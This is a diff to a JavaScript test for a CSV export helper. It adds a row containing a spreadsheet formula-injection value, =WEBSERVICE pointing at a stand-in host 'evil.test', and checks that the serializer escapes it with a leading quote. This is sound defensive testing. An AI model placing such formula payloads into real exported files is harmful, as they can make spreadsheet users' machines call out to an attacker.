@@ -16,12 +16,13 @@ const columns = [
 const rows = [
   { name: "Alpha", notes: "Line one" },
   { name: "Beta", notes: "Line \"two\"\nwrapped" },
+  { name: "=WEBSERVICE(\"https://evil.test\")", notes: "  @payload" },
 ];
 
 describe("API connection output helpers", () => {
   it("serializes normalized rows as UTF-8 BOM CSV with CRLF rows", () => {
     expect(serializeApiConnectionRowsToCsv({ columns, rows })).toBe(
-      `${UTF8_BOM}Name,Notes\r\nAlpha,Line one\r\nBeta,"Line ""two""\nwrapped"\r\n`,
+      `${UTF8_BOM}Name,Notes\r\nAlpha,Line one\r\nBeta,"Line ""two""\nwrapped"\r\n"'=WEBSERVICE(""https://evil.test"")",'  @payload\r\n`,
     );
   });
 
